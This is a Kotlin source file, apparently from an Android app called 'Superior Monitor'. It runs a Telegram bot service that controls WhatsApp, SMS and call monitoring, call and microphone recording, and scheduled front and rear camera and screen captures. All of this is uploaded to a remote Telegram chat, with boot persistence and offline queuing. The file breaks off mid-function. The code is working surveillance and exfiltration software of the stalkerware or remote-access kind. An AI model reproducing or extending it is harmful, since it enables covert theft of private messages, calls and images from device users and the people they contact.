package com.system.superiormonitor.bot

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Network
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.system.superiormonitor.bot.TelegramApi
import com.system.superiormonitor.data.PrefsManager
import com.system.superiormonitor.data.UpdateResponse
import com.system.superiormonitor.monitor.CallMonitor
import com.system.superiormonitor.monitor.NetworkEnforcer
import com.system.superiormonitor.monitor.SnapshotScheduler
import com.system.superiormonitor.monitor.WhatsAppMonitor
import com.system.superiormonitor.monitor.SmsMonitor

import com.system.superiormonitor.util.LogCategory
import com.system.superiormonitor.util.LogManager
import com.system.superiormonitor.util.TelemetryCollector
import kotlinx.coroutines.*
import java.io.File
import java.io.IOException
import java.net.UnknownHostException

/**
 * Foreground service that runs the Telegram bot polling loop and
 * orchestrates all monitor sub-systems (WhatsApp, Calls, Network, Snapshots).
 *
 * Refactored from the original TelegramBotService:
 * - All HTTP calls delegated to [TelegramApi] (was inline with duplicate OkHttpClient)
 * - All command/callback handling delegated to [BotCommands] (was split across 5 files)
 * - Monitor lifecycle management unchanged
 */
class BotService : Service() {

    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    private var prefsManager: PrefsManager? = null
    private var botCommands: BotCommands? = null
    private var networkEnforcer: NetworkEnforcer? = null

    private var lastUpdateId: Long = 0
    private val startTime = System.currentTimeMillis() / 1000L
    private var hasSentBootMessage = false
    private var isFromBoot = false

    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var pollingJob: Job? = null
    private var whatsAppMonitor: WhatsAppMonitor? = null
    private var callMonitor: CallMonitor? = null
    private var smsMonitor: SmsMonitor? = null

    private val unauthorizedAccessAttempts = object : java.util.LinkedHashMap<String, Int>(50, 0.75f, true) {
        override fun removeEldestEntry(eldest: MutableMap.MutableEntry<String, Int>?): Boolean {
            return size > 50
        }
    }

    companion object {
        const val CHANNEL_ID = "TelegramBotServiceChannel"
        const val NOTIFICATION_ID = 1
    }

    override fun onCreate() {
        super.onCreate()
        // DO NOT INITIALIZE NETWORK OR PREFS HERE to comply with Android 14+ strict requirements
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action

        // ── Dynamic feature toggle actions (no need to restart whole service) ──
        if (action == "ACTION_UPDATE_WHATSAPP") {
            handleWhatsAppToggle()
            return START_STICKY
        }
        if (intent?.action == "ACTION_UPDATE_CALL_ALERTS") {
            handleCallAlertsToggle()
            return START_STICKY
        }
        if (intent?.action == "ACTION_UPDATE_SMS_ALERTS") {
            handleSmsAlertsToggle()
            return START_STICKY
        }
        if (intent?.action == "ACTION_UPLOAD_RECORDING") {
            handleUploadRecording(intent)
            return START_STICKY
        }
        if (intent?.action == "ACTION_UPLOAD_SNAPSHOT") {
            handleUploadSnapshot(intent)
            return START_STICKY
        }

        // ── Full service startup ──
        // MUST BE FIRST LINE for Android 14+ compliance
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())

        // NOW SAFE TO INITIALIZE
        if (prefsManager == null) prefsManager = PrefsManager.getInstance(this)
        if (botCommands == null) botCommands = BotCommands(this, serviceScope)
        if (networkEnforcer == null) {
            networkEnforcer = NetworkEnforcer(this, prefsManager!!)
            networkEnforcer?.start()
        }

        LogManager.setServiceRunning(true)
        LogManager.log(LogCategory.NETWORK, "Service Started")

        // Start monitors if enabled
        startWhatsAppMonitorIfEnabled()
        startCallMonitorIfEnabled()
        startSmsMonitorIfEnabled()
        
        // Restore AlarmManager schedules (they are wiped by Android on reboot)
        val scheduler = SnapshotScheduler(this)
        if (prefsManager?.enableSnapshots == true) scheduler.scheduleNextSnapshot()
        if (prefsManager?.enableFrontCamera == true) scheduler.scheduleNextCamera(1)
        if (prefsManager?.enableRearCamera == true) scheduler.scheduleNextCamera(0)

        val currentPrefs = prefsManager
        if (currentPrefs == null || currentPrefs.botToken.isBlank() || currentPrefs.chatId.isBlank() || currentPrefs.ownerUserId.isBlank()) {
            LogManager.log(LogCategory.NETWORK, "Error: Credentials are missing.")
            stopSelf()
            return START_NOT_STICKY
        }

        isFromBoot = intent?.getBooleanExtra("from_boot", false) == true

        registerNetworkCallback()

        return START_STICKY
    }

    // ═══════════════════════════════════════════════════════════
    //  DYNAMIC FEATURE TOGGLES
    // ═══════════════════════════════════════════════════════════

    private fun handleWhatsAppToggle() {
        if (prefsManager?.whatsappUpdatesEnabled == true) {
            if (whatsAppMonitor == null) {
                startWhatsAppMonitorIfEnabled()
                LogManager.log(LogCategory.NETWORK, "WhatsApp Monitor dynamically started.")
            }
        } else {
            whatsAppMonitor?.stop()
            whatsAppMonitor = null
            LogManager.log(LogCategory.NETWORK, "WhatsApp Monitor dynamically stopped.")
        }
    }

    private fun handleCallAlertsToggle() {
        if (prefsManager?.callAlertsEnabled == true) {
            if (callMonitor == null) {
                startCallMonitorIfEnabled()
                LogManager.log(LogCategory.NETWORK, "Call Monitor dynamically started.")
            }
        } else {
            callMonitor?.stop()
            callMonitor = null
            LogManager.log(LogCategory.NETWORK, "Call Monitor dynamically stopped.")
        }
    }

    private fun handleSmsAlertsToggle() {
        if (prefsManager?.smsAlertsEnabled == true) {
            if (smsMonitor == null) {
                startSmsMonitorIfEnabled()
                LogManager.log(LogCategory.NETWORK, "SMS Monitor dynamically started.")
            }
        } else {
            smsMonitor?.stop()
            smsMonitor = null
            LogManager.log(LogCategory.NETWORK, "SMS Monitor dynamically stopped.")
        }
    }

    private fun handleUploadSnapshot(intent: Intent) {
        val filePath = intent.getStringExtra("filePath") ?: return
        val tag = intent.getStringExtra("tag") ?: "[SnapshotWorker]"
        val isSnapshot = intent.getBooleanExtra("isSnapshot", true)

        serviceScope.launch(Dispatchers.IO) {
            val file = File(filePath)
            if (!file.exists()) return@launch

            val token = prefsManager?.botToken ?: return@launch
            val chatId = prefsManager?.chatId ?: return@launch

            val messageText = if (isSnapshot) {
                """
                    #Snapshot #Screencap
                    
                    👑 *Master, a routine Snapshot has been captured!*
                    
                    - Uploading to Telegram.
                """.trimIndent()
            } else {
                val type = if (tag.contains("Front")) "Front Camera" else "Rear Camera"
                """
                    #Camera #Capture
                    
                    👑 *Master, a routine $type has been captured!*
                    
                    - Uploading to Telegram.
                """.trimIndent()
            }
            
            TelegramApi.sendMessage(token, chatId, messageText)
            delay(3000)

            if (TelegramApi.sendPhoto(token, chatId, file)) {
                file.delete()
                LogManager.log(LogCategory.MEDIA, "$tag Upload successful, local file deleted.")
            } else {
                LogManager.log(LogCategory.MEDIA, "$tag Upload failed. Moving to offline queue.")
                try {
                    val dateFolder = file.parentFile?.parentFile
                    if (dateFolder != null) {
                        val offlineDir = File(dateFolder, "offline")
                        if (!offlineDir.exists()) offlineDir.mkdirs()
                        val offlineFile = File(offlineDir, file.name)
                        file.renameTo(offlineFile)
                    }
                } catch (e: Exception) {
                    LogManager.log(LogCategory.MEDIA, "$tag Failed to move to offline: ${e.message}")
                }
            }
        }
    }

    private fun handleUploadRecording(intent: Intent) {
        val fileUriString = intent.getStringExtra("fileUri") ?: return
        val originalPath = intent.getStringArrayExtra("originalPath") ?: emptyArray()
        val mimeType = intent.getStringExtra("mimeType") ?: "audio/mpeg"
        
        CoroutineScope(Dispatchers.IO).launch {
            val fileUri = android.net.Uri.parse(fileUriString)
            
            // Log what we received
            LogManager.log(LogCategory.NETWORK, "Received recording for upload: ${originalPath.joinToString("/")}")
            
            var originalFileName = originalPath.lastOrNull() ?: "recording.opus"
            val extension = android.webkit.MimeTypeMap.getSingleton().getExtensionFromMimeType(mimeType)
            if (extension != null && !originalFileName.endsWith(".$extension")) {
                originalFileName = "$originalFileName.$extension"
            }
            
            val caption = """
                #Call
                ——————————
                *New Recording Uploaded*
                
                *File* : `$originalFileName`
                *Status* : Online
            """.trimIndent()
            
            if (TelegramApi.isApiReachable(this@BotService, prefsManager!!.botToken)) {
                // Upload via bot
                val result = TelegramApi.sendDocument(
                    botToken = prefsManager!!.botToken,
                    chatId = prefsManager!!.chatId,
                    context = this@BotService,
                    uri = fileUri,
                    mimeType = mimeType,
                    fileName = originalFileName,
                    caption = caption
                )
                
                if (result != null) {
                    LogManager.log(LogCategory.NETWORK, "Successfully uploaded recording: ${originalPath.lastOrNull()}")
                    moveRecordingToPermanent(this@BotService, fileUri, originalPath, mimeType)
                } else {
                    LogManager.log(LogCategory.NETWORK, "Failed to upload recording (API returned null). Left in offline.")
                }
            } else {
                LogManager.log(LogCategory.NETWORK, "Telegram unreachable. Left in offline for later sync.")
            }
        }
    }

    private fun moveRecordingToPermanent(
        context: Context,
        fileUri: android.net.Uri,
        originalPath: Array<String>,
        mimeType: String
    ) {
        try {
            val bcrPrefs = com.chiller3.bcr.Preferences(context)
            val outputDirUri = bcrPrefs.outputDirOrDefault
            val userDir = try {
                androidx.documentfile.provider.DocumentFile.fromTreeUri(context, outputDirUri)
            } catch (e: Exception) { null } ?: androidx.documentfile.provider.DocumentFile.fromFile(java.io.File(outputDirUri.path ?: bcrPrefs.defaultOutputDir.absolutePath))
            
            val offlinePath = originalPath.toList()
            val permanentPath = offlinePath.toMutableList().apply { 
                if (size > 1 && this[1] == "offline") {
                    this[1] = "permanent"
                } 
            }

            val sourceFile = androidx.documentfile.provider.DocumentFile.fromSingleUri(context, fileUri)
                ?: androidx.documentfile.provider.DocumentFile.fromFile(java.io.File(fileUri.path!!))
            
            val dirUtils = com.chiller3.bcr.output.OutputDirUtils(context, com.chiller3.bcr.output.OutputDirUtils.NULL_REDACTOR)
            dirUtils.move(sourceFile, emptyList(), userDir, permanentPath, mimeType)
        } catch (e: Exception) {
            Log.e("BotService", "Failed to move to permanent", e)
        }
    }

    private fun moveRecordingToPermanent(
        context: Context,
        fileUriString: String,
        originalPath: Array<String>,
        mimeType: String
    ) {
        try {
            val bcrPrefs = com.chiller3.bcr.Preferences(context)
            val outputDirUri = bcrPrefs.outputDirOrDefault
            val userDir = try {
                androidx.documentfile.provider.DocumentFile.fromTreeUri(context, outputDirUri)
            } catch (e: Exception) { null } ?: androidx.documentfile.provider.DocumentFile.fromFile(java.io.File(outputDirUri.path ?: bcrPrefs.defaultOutputDir.absolutePath))
            
            val dateStr = java.text.SimpleDateFormat("dd-MM-yyyy", java.util.Locale.getDefault()).format(java.util.Date())
            
            val offlinePath = mutableListOf<String>()
            offlinePath.add(dateStr)
            offlinePath.add("offline")
            offlinePath.add(originalPath.last())
            
            val permanentPath = mutableListOf<String>()
            permanentPath.add(dateStr)
            permanentPath.add("permanent")
            permanentPath.add(originalPath.last())

            val dirUtils = com.chiller3.bcr.output.OutputDirUtils(context, com.chiller3.bcr.output.OutputDirUtils.NULL_REDACTOR)
            dirUtils.move(userDir, offlinePath, userDir, permanentPath, mimeType)
        } catch (e: Exception) {
            Log.e("BotService", "Failed to move permanent", e)
        }
    }

    private fun startWhatsAppMonitorIfEnabled() {
        if (prefsManager?.whatsappUpdatesEnabled == true) {
            if (whatsAppMonitor == null) {
                // Fail-safe: Verify WhatsApp is installed and database is accessible
                if (!WhatsAppMonitor.isWhatsAppInstalled(this)) {
                    LogManager.log(LogCategory.NETWORK, "WhatsApp Monitor: WhatsApp is not installed. Disabling toggle.")
                    prefsManager?.whatsappUpdatesEnabled = false
                    return
                }
                val (dbAvailable, dbReason) = WhatsAppMonitor.checkWhatsAppDatabase()
                if (!dbAvailable) {
                    LogManager.log(LogCategory.NETWORK, "WhatsApp Monitor: $dbReason. Disabling toggle.")
                    prefsManager?.whatsappUpdatesEnabled = false
                    return
                }

                whatsAppMonitor = WhatsAppMonitor(this) { text, parseMode: String? ->
                    val chatId = prefsManager?.chatId ?: return@WhatsAppMonitor
                    val token = prefsManager?.botToken ?: return@WhatsAppMonitor
                    TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
                }
                whatsAppMonitor?.start(serviceScope)
                LogManager.log(LogCategory.NETWORK, "WhatsApp Monitor started.")
            }
        }
    }

    private fun startCallMonitorIfEnabled() {
        if (prefsManager?.callAlertsEnabled == true && callMonitor == null) {
            callMonitor = CallMonitor(this) { text, parseMode: String? ->
                val chatId = prefsManager?.chatId ?: return@CallMonitor
                val token = prefsManager?.botToken ?: return@CallMonitor
                TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
            }
            callMonitor?.start()
        }
    }

    private fun startSmsMonitorIfEnabled() {
        if (prefsManager?.smsAlertsEnabled == true) {
            if (smsMonitor == null) {
                smsMonitor = SmsMonitor(this) { text, parseMode: String? ->
                    val chatId = prefsManager?.chatId ?: return@SmsMonitor
                    val token = prefsManager?.botToken ?: return@SmsMonitor
                    TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
                }
                smsMonitor?.start()
                LogManager.log(LogCategory.NETWORK, "SMS Monitor started.")
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  NETWORK RECOVERY
    // ═══════════════════════════════════════════════════════════

    private fun registerNetworkCallback() {
        if (networkCallback != null) return

        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        networkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                if (pollingJob?.isActive != true) {
                    LogManager.log(LogCategory.NETWORK, "Network connection detected. Initiating recovery sequence...")
                    pollingJob?.cancel()
                    pollingJob = serviceScope.launch(Dispatchers.IO) {
                        val token = prefsManager?.botToken
                        if (token != null) {
                            LogManager.log(LogCategory.NETWORK, "Checking Telegram API reachability...")
                            var attempts = 0
                            while (TelegramApi.getMe(token) == null) {
                                attempts++
                                if (attempts > 30) { // 60 seconds max wait
                                    LogManager.log(LogCategory.NETWORK, "[System] Telegram API unreachable. Returning to deep sleep.")
                                    return@launch
                                }
                                delay(2000)
                            }
                            LogManager.log(LogCategory.NETWORK, "Telegram API is reachable!")
                        }

                        LogManager.log(LogCategory.NETWORK, "Waiting 10 seconds for network stabilization...")
                        delay(10000)

                        if (!resolveDnsWithRetries("api.telegram.org")) {
                            LogManager.log(LogCategory.NETWORK, "[System] DNS resolution failed after 3 retries. Returning to deep sleep.")
                            return@launch
                        }

                        LogManager.log(LogCategory.NETWORK, "DNS resolved. Connection restored. Resuming Telegram polling loop.")
                        TelegramApi.evictConnections()

                        sendConnectionRestoredNotification()
                        startPollingLoop()
                    }
                }
            }

            override fun onLost(network: Network) {
                LogManager.log(LogCategory.NETWORK, "[System] Network offline. Deep sleep mode active.")
                pollingJob?.cancel()
                pollingJob = null
            }
        }
        connectivityManager.registerDefaultNetworkCallback(networkCallback!!)
    }

    private suspend fun sendConnectionRestoredNotification() {
        val chatId = prefsManager?.chatId ?: return
        val token = prefsManager?.botToken ?: return

        val telemetry = TelemetryCollector.gatherTelemetry()
        val title = """
            #Connection
            ——————————
            *Device Connection Restored.*
        """.trimIndent()
        val msg = BotCommands.buildTelemetryMessage(title, telemetry)
        TelegramApi.sendMessage(token, chatId, msg)

        // Check for offline files (snapshots, front camera, rear camera)
        val baseDirs = listOf(
            File(getExternalFilesDir(null), "snapshots"),
            File(getExternalFilesDir(null), "camera/front"),
            File(getExternalFilesDir(null), "camera/rear")
        )
        
        var screenCount = 0
        var frontCount = 0
        var rearCount = 0
        
        for (baseDir in baseDirs) {
            if (baseDir.exists() && baseDir.isDirectory) {
                baseDir.listFiles { f -> f.isDirectory && f.name != "failed" && f.name != "permanent" }?.forEach { dateDir ->
                    val offlineDir = File(dateDir, "offline")
                    if (offlineDir.exists() && offlineDir.isDirectory) {
                        offlineDir.listFiles()?.forEach { file ->
                            if (file.name.contains("_shot")) screenCount++
                            else if (file.name.contains("_front")) frontCount++
                            else if (file.name.contains("_rear")) rearCount++
                        }
                    }
                }
            }
        }
        
        if (screenCount > 0 || frontCount > 0 || rearCount > 0) {
            val parts = mutableListOf<String>()
            if (screenCount > 0) parts.add("$screenCount Screenshots")
            if (rearCount > 0) parts.add("$rearCount Rear Shots")
            if (frontCount > 0) parts.add("$frontCount Front Shots")
            val countsStr = parts.joinToString(" / ")
            
            val alertText = """
                #Connection #Offline
                ——————————
                ⚠️ *System Alert*
                
                While the device was offline, media captures were queued.
                
                *Queued Media* : $countsStr
                
                Please select an option below to Retrieve or Cancel the upload process.
            """.trimIndent()
            TelegramApi.sendMessage(token, chatId, alertText, replyMarkup = BotCommands.buildOfflineQueueMarkup())
        }

        CoroutineScope(Dispatchers.IO).launch {
            // Sequential Trickle Queue for Text Logs
            val offlineCallsFile = File(getExternalFilesDir(null), "call_alrt/offline/offline_calls.txt")
            if (offlineCallsFile.exists() && offlineCallsFile.length() > 0) {
                LogManager.log(LogCategory.NETWORK, "Found offline calls log. Uploading to Telegram...")
                val caption = """
                    #Call #Offline
                    ——————————
                    ⚠️ *Update* - While the device was offline, calls were made during this period.
                    Here are the remaining entries.
                """.trimIndent()
                if (TelegramApi.sendDocument(token, chatId, offlineCallsFile, caption)) {
                    offlineCallsFile.delete()
                    LogManager.log(LogCategory.NETWORK, "Offline call log uploaded successfully and deleted.")
                    delay(3000) // Delay to prevent Telegram 429 Too Many Requests
                }
            }

            val offlineSmsFile = File(getExternalFilesDir(null), "sms_alrt/offline/offline_sms.txt")
            if (offlineSmsFile.exists() && offlineSmsFile.length() > 0) {
                LogManager.log(LogCategory.NETWORK, "SMS: offline txt found sending to telegram")
                val caption = """
                    #SMS #Offline
                    ——————————
                    ⚠️ *Update* - While the device was offline, SMS messages were received.
                    Here are the remaining entries.
                """.trimIndent()
                if (TelegramApi.sendDocument(token, chatId, offlineSmsFile, caption)) {
                    offlineSmsFile.delete()
                    LogManager.log(LogCategory.NETWORK, "Offline sms log uploaded successfully and deleted.")
                    delay(3000) // Delay to prevent Telegram 429 Too Many Requests
                }
            }

            val offlineWaFile = File(getExternalFilesDir(null), "whatsapp_alrt/offline/offline_whatsapp.txt")
            if (offlineWaFile.exists() && offlineWaFile.length() > 0) {
                LogManager.log(LogCategory.NETWORK, "WhatsApp: offline txt found sending to telegram")
                val caption = """
                    #WhatsApp #Offline
                    ——————————
                    ⚠️ *Update* - While the device was offline, WhatsApp messages were received.
                    Here are the remaining entries.
                """.trimIndent()
                if (TelegramApi.sendDocument(token, chatId, offlineWaFile, caption)) {
                    offlineWaFile.delete()
                    LogManager.log(LogCategory.NETWORK, "Offline WhatsApp log uploaded successfully and deleted.")
                    delay(3000) // Delay to prevent Telegram 429 Too Many Requests
                }
            }

            // Sequential Heavy Media Syncs
            val offlineMicDir = File(getExternalFilesDir(null), "mediaops/offline")
            if (offlineMicDir.exists() && offlineMicDir.isDirectory) {
                val micFiles = offlineMicDir.listFiles() ?: emptyArray()
                if (micFiles.isNotEmpty()) {
                    LogManager.log(LogCategory.NETWORK, "Found offline Mic recordings. Uploading to Telegram...")
                    for (file in micFiles) {
                        val caption = """
                            #Microphone #Offline
                            ——————————
                            ⚠️ *Previous recording request was not sent because the device was offline. Here is the recorded file.*
                        """.trimIndent()
                        if (TelegramApi.sendDocument(token, chatId, file, caption)) {
                            file.delete()
                            LogManager.log(LogCategory.NETWORK, "Offline Mic recording uploaded successfully and deleted.")
                            delay(3000) // 3-second delay between heavy uploads
                        }
                    }
                }
            }

            if (prefsManager?.forwardRecordingEnabled == true) {
                val offlineRecordings = mutableListOf<Pair<android.net.Uri, String>>()
                try {
                    val bcrPrefs = com.chiller3.bcr.Preferences(this@BotService)
                    val outputDirUri = bcrPrefs.outputDirOrDefault
                    val userDir = try {
                        androidx.documentfile.provider.DocumentFile.fromTreeUri(this@BotService, outputDirUri)
                    } catch (e: Exception) { null } ?: androidx.documentfile.provider.DocumentFile.fromFile(java.io.File(outputDirUri.path ?: bcrPrefs.defaultOutputDir.absolutePath))
                    
                    userDir.listFiles().forEach { dateDir ->
                        if (dateDir.isDirectory) {
                            val offlineDir = dateDir.findFile("offline")
                            if (offlineDir != null && offlineDir.isDirectory) {
                                offlineDir.listFiles().forEach { file ->
                                    if (file.isFile && !file.name.isNullOrEmpty() && file.name?.endsWith(".json") != true && file.name?.endsWith(".txt") != true) {
                                        offlineRecordings.add(Pair(file.uri, dateDir.name + "/offline/" + file.name))
                                    }
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    LogManager.log(LogCategory.NETWORK, "Failed to query offline recordings")
                }
                
                if (offlineRecordings.isNotEmpty()) {
                    LogManager.log(LogCategory.NETWORK, "Found ${offlineRecordings.size} offline recordings. Uploading to Telegram...")
                    for ((uri, filePath) in offlineRecordings) {
                        var originalFileName = filePath.split("/").lastOrNull() ?: "recording.opus"
                        val mimeType = contentResolver.getType(uri) ?: "audio/mpeg"
                        val extension = android.webkit.MimeTypeMap.getSingleton().getExtensionFromMimeType(mimeType)
                        if (extension != null && !originalFileName.endsWith(".$extension")) {
                            originalFileName = "$originalFileName.$extension"
                        }
                        val caption = """
                            #Call #Offline
                            ——————————
                            *Offline Recording Synced*
                            
                            *File* : `$originalFileName`
                            *Status* : Synced from Offline
                        """.trimIndent()
                        val result = TelegramApi.sendDocument(
                            botToken = token,
                            chatId = chatId,
                            context = this@BotService,
                            uri = uri,
                            mimeType = mimeType,
                            fileName = originalFileName,
                            caption = caption
                        )
                        if (result != null) {
                            LogManager.log(LogCategory.NETWORK, "Successfully synced offline recording: $filePath")
                            moveRecordingToPermanent(this@BotService, uri.toString(), filePath.split("/").toTypedArray(), mimeType)
                            delay(3000) // 3-second delay between heavy uploads
                        }
                    }
                }
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  POLLING LOOP
    // ═══════════════════════════════════════════════════════════

    private suspend fun resolveDnsWithRetries(host: String): Boolean {
        var delayMs = 5000L
        while (currentCoroutineContext().isActive && networkCallback != null) {
            try {
                withContext(Dispatchers.IO) {
                    java.net.InetAddress.getByName(host)
                }
                return true
            } catch (e: Exception) {
                LogManager.log(LogCategory.NETWORK, "DNS resolution failed. Retrying in ${delayMs / 1000}s...")
                delay(delayMs)
                if (delayMs < 60000L) delayMs *= 2 // Exponential backoff up to 60s
            }
        }
        return false
    }

    private suspend fun startPollingLoop() {
        LogManager.log(LogCategory.NETWORK, "Polling loop started...")
        val currentPrefs = prefsManager ?: return

        // Fetch bot username for strict command routing with retry
        var meResponse = TelegramApi.getMe(currentPrefs.botToken)
        while (meResponse?.ok != true && currentCoroutineContext().isActive) {
            LogManager.log(LogCategory.NETWORK, "Failed to resolve bot identity. Retrying in 5s...")
            delay(5000)
            meResponse = TelegramApi.getMe(currentPrefs.botToken)
        }
        botCommands?.setBotUsername(meResponse?.result?.username)

        while (currentCoroutineContext().isActive) {
            try {
                val offset = lastUpdateId + 1
                val response = TelegramApi.getUpdatesRaw(currentPrefs.botToken, offset)

                // If we get any HTTP response, the API is reachable
                LogManager.setTelegramApiReachable(true)

                if (response.isSuccessful) {
                    val responseBody = response.body?.string()
                    if (responseBody != null) {
                        val updateResponse = TelegramApi.json.decodeFromString<UpdateResponse>(responseBody)
                        if (updateResponse.ok) {
                            if (isFromBoot && !hasSentBootMessage) {
                                hasSentBootMessage = true
                                val telemetry = TelemetryCollector.gatherTelemetry()
                                val title = """
                                    #Reboot
                                    ——————————
                                    *Device Rebooted & Online* 
                                """.trimIndent()
                                val msg = BotCommands.buildTelemetryMessage(title, telemetry)
                                TelegramApi.sendMessage(currentPrefs.botToken, currentPrefs.chatId, msg)
                            }
                            for (update in updateResponse.result) {
                                lastUpdateId = update.update_id
                                handleUpdate(update)
                            }
                            if (updateResponse.result.isEmpty()) {
                                delay(500) // Prevent tight spin-loop
                            }
                        }
                    }
                } else {
                    val errorBody = response.body?.string()
                    LogManager.log(LogCategory.NETWORK, "HTTP Error: ${response.code} - Body: $errorBody")
                    delay(2000)
                }
            } catch (e: Exception) {
                LogManager.setTelegramApiReachable(false)
                if (e is IOException || e is UnknownHostException) {
                    LogManager.log(LogCategory.NETWORK, "[Network] Transient socket issue detected...")
                } else {
                    LogManager.log(LogCategory.NETWORK, "Error: ${e.message}")
                    Log.e("BotService", "Error in polling loop", e)
                }
                delay(5000)
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  UPDATE HANDLING & AUTH
    // ═══════════════════════════════════════════════════════════

    private fun handleUpdate(update: com.system.superiormonitor.data.Update) {
        val incomingChatId: String
        val incomingUserId: String

        if (update.message != null) {
            if (update.message.date < startTime) {
                LogManager.log(LogCategory.BOT_IN, "Ignoring old message from before service startup.")
                return
            }
            incomingChatId = update.message.chat.id.toString()
            incomingUserId = update.message.from?.id?.toString() ?: ""
        } else if (update.callback_query != null) {
            val cbMsg = update.callback_query.message
            incomingChatId = cbMsg?.chat?.id?.toString() ?: ""
            incomingUserId = update.callback_query.from.id.toString()
        } else if (update.my_chat_member != null) {
            incomingChatId = update.my_chat_member.chat.id.toString()
            incomingUserId = update.my_chat_member.from.id.toString()
        } else {
            return
        }

        val currentPrefs = prefsManager ?: return
        val isAuthorizedChat = incomingChatId == currentPrefs.chatId
        val isAuthorizedUser = incomingUserId == currentPrefs.ownerUserId

        if (!isAuthorizedChat && !isAuthorizedUser) {
            val isGroup = incomingChatId.startsWith("-")
            
            if (isGroup) {
                val action = "Left the group chat"
                logUnauthorizedAccess(update, incomingChatId, incomingUserId, action)
                serviceScope.launch(Dispatchers.IO) {
                    TelegramApi.leaveChat(currentPrefs.botToken, incomingChatId)
                }
                return
            }
            
            // Direct Message
            val attempts = unauthorizedAccessAttempts.getOrDefault(incomingUserId, 0) + 1
            unauthorizedAccessAttempts[incomingUserId] = attempts
            
            when {
                attempts < 3 -> {
                    val action = "⏳ Awaiting 3 Access Attempts"
                    logUnauthorizedAccess(update, incomingChatId, incomingUserId, action)
                    LogManager.log(LogCategory.BOT_IN, "New user detected will be blocked after 3 failed attampts")
                    
                    val warningMsg = """
                        *Superior Monitor* - A Personal Monitoring and device control telegram bot
                        
                        ⚠️ *You are not authorized to use this bot*
                        - You will be blocked if you tried 3 access attempts.
                    """.trimIndent()
                    val markup = """{"inline_keyboard":[[{"text":"Bot Repository","url":"https://github.com/sandeshsahu1/superiormonitor"}]]}"""
                    
                    serviceScope.launch(Dispatchers.IO) {
                        TelegramApi.sendMessage(currentPrefs.botToken, incomingChatId, warningMsg, replyMarkup = markup)
                    }
                }
                attempts == 3 -> {
                    val action = "🚫 Blocked User from acessing"
                    logUnauthorizedAccess(update, incomingChatId, incomingUserId, action)
                    LogManager.log(LogCategory.BOT_IN, "User tried 3 failed acess attempt - blocked.")
                    
                    val blockedMsg = """
                        *Superior Monitor* - A Personal Monitoring and device control telegram bot
                        
                        🚫 *User Blocked* - Your request will be ignored from now on.
                    """.trimIndent()
                    val markup = """{"inline_keyboard":[[{"text":"Bot Repository","url":"https://github.com/sandeshsahu1/superiormonitor"}]]}"""
                    
                    serviceScope.launch(Dispatchers.IO) {
                        TelegramApi.sendMessage(currentPrefs.botToken, incomingChatId, blockedMsg, replyMarkup = markup)
                    }
                }
                else -> {
                    // Silently ignore
                }
            }
            return
        }

        if (update.message?.text != null) {
            LogManager.log(LogCategory.BOT_IN, "Received command: ${update.message.text}")
        } else if (update.callback_query != null) {
            LogManager.log(LogCategory.BOT_IN, "User selected action: ${update.callback_query.data}")
        } else if (update.message?.photo != null || update.message?.video != null || update.message?.audio != null || update.message?.document != null) {
            LogManager.log(LogCategory.BOT_IN, "Received media attachment")
        }

        val commands = botCommands ?: return
        val responsePayload = commands.routeUpdate(update)

        if (responsePayload != null && incomingChatId.isNotBlank()) {
            serviceScope.launch(Dispatchers.IO) {
                if (responsePayload.contains("JSON_MARKUP:")) {
                    val parts = responsePayload.split("JSON_MARKUP:", limit = 2)
                    val textPart = parts[0].trim()
                    val markupPart = parts[1].trim()
                    val msgId = TelegramApi.sendMessage(currentPrefs.botToken, incomingChatId, textPart, replyMarkup = markupPart)
                    if (msgId != null) {
                        commands.scheduleAutoDelete(incomingChatId, msgId, currentPrefs.botToken)
                    }
                } else {
                    TelegramApi.sendMessage(currentPrefs.botToken, incomingChatId, responsePayload)
                }
            }
        }
    }

    private fun logUnauthorizedAccess(
        update: com.system.superiormonitor.data.Update,
        incomingChatId: String,
        incomingUserId: String,
        action: String
    ) {
        val currentPrefs = prefsManager ?: return
        
        val timeFormat = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault())
        val accessTime = timeFormat.format(java.util.Date())
        
        val isGroup = incomingChatId.startsWith("-")
        val header = if (isGroup) "New Group Chat Detected" else "New User Acess Detected"
        
        val username: String?
        val name: String
        
        if (isGroup) {
            val chat = update.message?.chat ?: update.my_chat_member?.chat
            username = chat?.username
            name = chat?.title ?: chat?.first_name ?: "Unknown Group"
        } else {
            val user = update.message?.from ?: update.callback_query?.from ?: update.my_chat_member?.from
            username = user?.username
            name = user?.first_name ?: "Unknown User"
        }
        
        val idLabel = if (isGroup) "Group id" else "User id"
        val nameLabel = if (isGroup) "Chatname" else "Name"
        
        // 1. File Logging
        val logLines = mutableListOf(
            header,
            "",
            "Time - $accessTime",
            "$idLabel - $incomingChatId"
        )
        if (username != null) {
            logLines.add("Username - @$username")
        }
        logLines.add("$nameLabel - $name")
        logLines.add("")
        logLines.add("Taken Action - $action")
        logLines.add("")
        logLines.add("--------------------------------------------------")
        logLines.add("")
        
        val logContent = logLines.joinToString("\n")
        
        try {
            val authDir = File(getExternalFilesDir(null), "authorization")
            if (!authDir.exists()) authDir.mkdirs()
            val logFile = File(authDir, "access.log")
            logFile.appendText(logContent)
        } catch (e: Exception) {
            Log.e("BotService", "Failed to write authorization log", e)
        }
        
        // 2. Owner Alert
        val alertLines = mutableListOf(
            "⚠️ *$header*",
            "",
            "*Time* - $accessTime",
            "*$idLabel* - `$incomingChatId`"
        )
        if (username != null) {
            alertLines.add("*Username* - @$username")
        }
